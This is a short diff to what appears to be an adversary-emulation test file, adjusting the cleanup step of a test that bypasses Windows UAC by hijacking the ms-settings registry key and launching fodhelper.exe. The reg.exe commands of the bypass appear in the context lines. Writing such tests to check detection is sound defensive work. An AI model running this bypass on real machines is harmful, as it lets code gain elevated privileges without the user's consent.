@@ -67,7 +67,7 @@ atomic_tests:
       reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute"
       fodhelper.exe
     cleanup_command: |
-      Remove-Item "HKCU:\software\classes\ms-settings" -force -Recurse
+      reg.exe delete hkcu\software\classes\ms-settings /f
 
 - name: Bypass UAC using Fodhelper - PowerShell
   description: |
